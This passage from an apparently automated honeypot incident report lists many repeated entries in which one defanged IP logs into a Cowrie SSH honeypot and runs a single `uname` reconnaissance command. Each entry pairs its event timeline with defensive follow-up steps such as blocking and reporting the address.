| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:42` | `cowrie.session.connect` |
| `2026-08-20 19:28:43` | `cowrie.client.version` |
| `2026-08-20 19:28:44` | `cowrie.client.kex` |
| `2026-08-20 19:28:57` | `cowrie.login.success` |
| `2026-08-20 19:29:03` | `cowrie.session.params` |
| `2026-08-20 19:29:03` | `cowrie.command.input` |
| `2026-08-20 19:29:07` | `cowrie.log.closed` |
| `2026-08-20 19:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b770fbafad4

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:44` | `cowrie.session.connect` |
| `2026-08-20 19:28:46` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:28:59` | `cowrie.login.success` |
| `2026-08-20 19:29:16` | `cowrie.session.params` |
| `2026-08-20 19:29:16` | `cowrie.command.input` |
| `2026-08-20 19:29:18` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7af82f2cdbc0

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:44` | `cowrie.session.connect` |
| `2026-08-20 19:28:46` | `cowrie.client.version` |
| `2026-08-20 19:28:53` | `cowrie.client.kex` |
| `2026-08-20 19:29:04` | `cowrie.login.success` |
| `2026-08-20 19:29:13` | `cowrie.session.params` |
| `2026-08-20 19:29:13` | `cowrie.command.input` |
| `2026-08-20 19:29:19` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d06ce709727d

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:44` | `cowrie.session.connect` |
| `2026-08-20 19:28:46` | `cowrie.client.version` |
| `2026-08-20 19:28:52` | `cowrie.client.kex` |
| `2026-08-20 19:28:59` | `cowrie.login.success` |
| `2026-08-20 19:29:08` | `cowrie.session.params` |
| `2026-08-20 19:29:08` | `cowrie.command.input` |
| `2026-08-20 19:29:12` | `cowrie.log.closed` |
| `2026-08-20 19:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b509726d26

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:46` | `cowrie.session.connect` |
| `2026-08-20 19:28:47` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:28:54` | `cowrie.login.success` |
| `2026-08-20 19:29:00` | `cowrie.session.params` |
| `2026-08-20 19:29:00` | `cowrie.command.input` |
| `2026-08-20 19:29:01` | `cowrie.log.closed` |
| `2026-08-20 19:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48921ca7117f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:46` | `cowrie.session.connect` |
| `2026-08-20 19:28:47` | `cowrie.client.version` |
| `2026-08-20 19:28:57` | `cowrie.client.kex` |
| `2026-08-20 19:29:08` | `cowrie.login.success` |
| `2026-08-20 19:29:18` | `cowrie.session.params` |
| `2026-08-20 19:29:18` | `cowrie.command.input` |
| `2026-08-20 19:29:21` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722fd825e616

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:46` | `cowrie.session.connect` |
| `2026-08-20 19:28:47` | `cowrie.client.version` |
| `2026-08-20 19:29:10` | `cowrie.client.kex` |
| `2026-08-20 19:29:26` | `cowrie.login.success` |
| `2026-08-20 19:29:33` | `cowrie.session.params` |
| `2026-08-20 19:29:33` | `cowrie.command.input` |
| `2026-08-20 19:29:36` | `cowrie.log.closed` |
| `2026-08-20 19:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d693ace5bf1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:47` | `cowrie.session.connect` |
| `2026-08-20 19:28:47` | `cowrie.client.version` |
| `2026-08-20 19:28:51` | `cowrie.client.kex` |
| `2026-08-20 19:28:57` | `cowrie.login.success` |
| `2026-08-20 19:29:02` | `cowrie.session.params` |
| `2026-08-20 19:29:02` | `cowrie.command.input` |
| `2026-08-20 19:29:07` | `cowrie.log.closed` |
| `2026-08-20 19:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-531c09d08a3f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:47` | `cowrie.session.connect` |
| `2026-08-20 19:28:47` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:28:59` | `cowrie.login.success` |
| `2026-08-20 19:29:15` | `cowrie.session.params` |
| `2026-08-20 19:29:15` | `cowrie.command.input` |
| `2026-08-20 19:29:20` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e60c20a8192b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:47` | `cowrie.session.connect` |
| `2026-08-20 19:28:47` | `cowrie.client.version` |
| `2026-08-20 19:28:47` | `cowrie.client.kex` |
| `2026-08-20 19:29:02` | `cowrie.login.success` |
| `2026-08-20 19:29:12` | `cowrie.session.params` |
| `2026-08-20 19:29:12` | `cowrie.command.input` |
| `2026-08-20 19:29:18` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ddd7bef3324

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:52` | `cowrie.session.connect` |
| `2026-08-20 19:28:53` | `cowrie.client.version` |
| `2026-08-20 19:28:54` | `cowrie.client.kex` |
| `2026-08-20 19:29:00` | `cowrie.login.success` |
| `2026-08-20 19:29:06` | `cowrie.session.params` |
| `2026-08-20 19:29:06` | `cowrie.command.input` |
| `2026-08-20 19:29:11` | `cowrie.log.closed` |
| `2026-08-20 19:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1ecd4223a8f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:53` | `cowrie.session.connect` |
| `2026-08-20 19:28:53` | `cowrie.client.version` |
| `2026-08-20 19:28:57` | `cowrie.client.kex` |
| `2026-08-20 19:29:16` | `cowrie.login.success` |
| `2026-08-20 19:29:24` | `cowrie.session.params` |
| `2026-08-20 19:29:24` | `cowrie.command.input` |
| `2026-08-20 19:29:30` | `cowrie.log.closed` |
| `2026-08-20 19:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-985f15318af2

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:53` | `cowrie.session.connect` |
| `2026-08-20 19:28:53` | `cowrie.client.version` |
| `2026-08-20 19:28:56` | `cowrie.client.kex` |
| `2026-08-20 19:29:07` | `cowrie.login.success` |
| `2026-08-20 19:29:19` | `cowrie.session.params` |
| `2026-08-20 19:29:19` | `cowrie.command.input` |
| `2026-08-20 19:29:23` | `cowrie.log.closed` |
| `2026-08-20 19:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c48b5fb18ab4

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:53` | `cowrie.session.connect` |
| `2026-08-20 19:28:53` | `cowrie.client.version` |
| `2026-08-20 19:28:54` | `cowrie.client.kex` |
| `2026-08-20 19:29:05` | `cowrie.login.success` |
| `2026-08-20 19:29:21` | `cowrie.session.params` |
| `2026-08-20 19:29:21` | `cowrie.command.input` |
| `2026-08-20 19:29:27` | `cowrie.log.closed` |
| `2026-08-20 19:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b75147dc91

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:53` | `cowrie.session.connect` |
| `2026-08-20 19:28:53` | `cowrie.client.version` |
| `2026-08-20 19:28:54` | `cowrie.client.kex` |
| `2026-08-20 19:29:03` | `cowrie.login.success` |
| `2026-08-20 19:29:12` | `cowrie.session.params` |
| `2026-08-20 19:29:12` | `cowrie.command.input` |
| `2026-08-20 19:29:20` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c0e090046ee

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:53` | `cowrie.session.connect` |
| `2026-08-20 19:28:53` | `cowrie.client.version` |
| `2026-08-20 19:28:54` | `cowrie.client.kex` |
| `2026-08-20 19:29:00` | `cowrie.login.success` |
| `2026-08-20 19:29:07` | `cowrie.session.params` |
| `2026-08-20 19:29:07` | `cowrie.command.input` |
| `2026-08-20 19:29:11` | `cowrie.log.closed` |
| `2026-08-20 19:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14eac537ca36

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:53` | `cowrie.session.connect` |
| `2026-08-20 19:28:53` | `cowrie.client.version` |
| `2026-08-20 19:28:54` | `cowrie.client.kex` |
| `2026-08-20 19:29:04` | `cowrie.login.success` |
| `2026-08-20 19:29:14` | `cowrie.session.params` |
| `2026-08-20 19:29:14` | `cowrie.command.input` |
| `2026-08-20 19:29:20` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c7beb2d06ba

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:53` | `cowrie.session.connect` |
| `2026-08-20 19:28:53` | `cowrie.client.version` |
| `2026-08-20 19:28:54` | `cowrie.client.kex` |
| `2026-08-20 19:29:05` | `cowrie.login.success` |
| `2026-08-20 19:29:15` | `cowrie.session.params` |
| `2026-08-20 19:29:15` | `cowrie.command.input` |
| `2026-08-20 19:29:19` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1153527323c

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:55` | `cowrie.session.connect` |
| `2026-08-20 19:28:57` | `cowrie.client.version` |
| `2026-08-20 19:29:00` | `cowrie.client.kex` |
| `2026-08-20 19:29:13` | `cowrie.login.success` |
| `2026-08-20 19:29:22` | `cowrie.session.params` |
| `2026-08-20 19:29:22` | `cowrie.command.input` |
| `2026-08-20 19:29:27` | `cowrie.log.closed` |
| `2026-08-20 19:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4c94abcf60a

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:55` | `cowrie.session.connect` |
| `2026-08-20 19:28:57` | `cowrie.client.version` |
| `2026-08-20 19:28:57` | `cowrie.client.kex` |
| `2026-08-20 19:29:06` | `cowrie.login.success` |
| `2026-08-20 19:29:18` | `cowrie.session.params` |
| `2026-08-20 19:29:18` | `cowrie.command.input` |
| `2026-08-20 19:29:21` | `cowrie.log.closed` |
| `2026-08-20 19:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69625cc85b91

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:57` | `cowrie.session.connect` |
| `2026-08-20 19:28:57` | `cowrie.client.version` |
| `2026-08-20 19:29:00` | `cowrie.client.kex` |
| `2026-08-20 19:29:14` | `cowrie.login.success` |
| `2026-08-20 19:29:24` | `cowrie.session.params` |
| `2026-08-20 19:29:24` | `cowrie.command.input` |
| `2026-08-20 19:29:30` | `cowrie.log.closed` |
| `2026-08-20 19:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74e07f0de825

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:57` | `cowrie.session.connect` |
| `2026-08-20 19:28:57` | `cowrie.client.version` |
| `2026-08-20 19:29:00` | `cowrie.client.kex` |
| `2026-08-20 19:29:14` | `cowrie.login.success` |
| `2026-08-20 19:29:27` | `cowrie.session.params` |
| `2026-08-20 19:29:27` | `cowrie.command.input` |
| `2026-08-20 19:29:30` | `cowrie.log.closed` |
| `2026-08-20 19:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4384e876de3b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:59` | `cowrie.session.connect` |
| `2026-08-20 19:29:00` | `cowrie.client.version` |
| `2026-08-20 19:29:00` | `cowrie.client.kex` |
| `2026-08-20 19:29:16` | `cowrie.login.success` |
| `2026-08-20 19:29:26` | `cowrie.session.params` |
| `2026-08-20 19:29:26` | `cowrie.command.input` |
| `2026-08-20 19:29:30` | `cowrie.log.closed` |
| `2026-08-20 19:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce7941f438e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:59` | `cowrie.session.connect` |
| `2026-08-20 19:29:00` | `cowrie.client.version` |
| `2026-08-20 19:29:10` | `cowrie.client.kex` |
| `2026-08-20 19:29:26` | `cowrie.login.success` |
| `2026-08-20 19:29:33` | `cowrie.session.params` |
| `2026-08-20 19:29:33` | `cowrie.command.input` |
| `2026-08-20 19:29:35` | `cowrie.log.closed` |
| `2026-08-20 19:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-399db5ccc089

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:59` | `cowrie.session.connect` |
| `2026-08-20 19:29:00` | `cowrie.client.version` |
| `2026-08-20 19:29:01` | `cowrie.client.kex` |
| `2026-08-20 19:29:20` | `cowrie.login.success` |
| `2026-08-20 19:29:30` | `cowrie.session.params` |
| `2026-08-20 19:29:30` | `cowrie.command.input` |
| `2026-08-20 19:29:33` | `cowrie.log.closed` |
| `2026-08-20 19:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cb138e7b24b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:59` | `cowrie.session.connect` |
| `2026-08-20 19:29:00` | `cowrie.client.version` |
| `2026-08-20 19:29:03` | `cowrie.client.kex` |
| `2026-08-20 19:29:18` | `cowrie.login.success` |
| `2026-08-20 19:29:23` | `cowrie.session.params` |
| `2026-08-20 19:29:23` | `cowrie.command.input` |
| `2026-08-20 19:29:28` | `cowrie.log.closed` |
| `2026-08-20 19:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
